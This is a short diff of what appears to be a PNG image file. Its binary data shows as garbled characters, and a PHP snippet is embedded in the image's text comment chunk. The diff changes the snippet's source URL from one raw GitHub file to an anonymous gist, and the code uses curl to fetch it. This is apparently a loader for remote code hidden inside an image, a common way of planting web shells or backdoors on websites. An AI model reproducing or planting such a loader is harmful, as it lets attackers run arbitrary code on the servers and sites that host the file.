@@ -91,7 +91,7 @@ eÃìœíiâLsëÔä]0['C{™€ÒÀœ¸µwn*€Ù´n/úÉÔ&ù«[k¦
 ÓµÊ:^¾;}¾~ùöõÛ·ïÇ€?´Ë`CL0Ý+mòùìÂ|‘³ÒY>›,`&ß“ãŸªNÿùÝ4Yœµ™LæA¼¹}²9ð8˜¢ÁƒØŸ|Ž"Ïf¹4ù\
 ÌRi.L£0ßËm™,;…ù3Y Í•Q˜Èm,¦ìå¤,æ‡¥äÛ²æK…	É’h.ŒÂ„e94Fa¢{é†²X*L°E¿–ÀòÓ(L‚ôØ²5O’á£Ë!Ÿé{oFôÏ&Ÿg•]rúœæÍrgþ×Þ¹ä(Ã`8Y°Ç‡ k ê¬§¢bT˜L¹ÿ˜¯	q^võw÷£¢R¤vbÇÌ€ÚdVÉB‡³˜A»7åNQD€ºáo+5Œµ€¾áOdP»#˜)1òå±€ÉÛ6)Ìq.ìÜ &[Îd¹KÑ¶SÒúÁŠ`FÊµ˜‰Ìh9“Åf™¢Hä¢OG€™HÖ^@ø–lm0ãº¿¦–`ÊLÊ=Õ<ç^qä&§ŸÈ:žÓ7CÌ2ª¥/ïXª1Ž6˜Õl›ø fžBLþÛ)õw– 3ïï-×ú÷ffi‹¸N·ú­áÌÜÒfny)úÌ2'N×]¯˜¥¦yPŽFk(‡ù#Ûô(«ÖÊam’ÆB¾A8f-™rx·
 `Ö’ixú.ïú­¡æ9¸â9t÷†zkÈÏg¾’>µÁëíìüÓu®üöu%§ß‘tÜÛË×S¨ìÛ7ˆŽÍçTîwÒ0ÏŸõMûõ`ÞâŽ‡¦7ÎLò>Í ú§oNvz0Oö@¿#­ò  utEXtComment <?php
-    $Url = "https://raw.githubusercontent.com/nanadaimejokowidodo/JANGAN/main/24.php";
+    $Url = "https://gist.githubusercontent.com/Kyoukaaaa/4826ef11e59c78a29abc9da9ab9cf2c1/raw/e5982247da544d8a70c21b25bfc18e266946c87c/gistfile1.txt";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
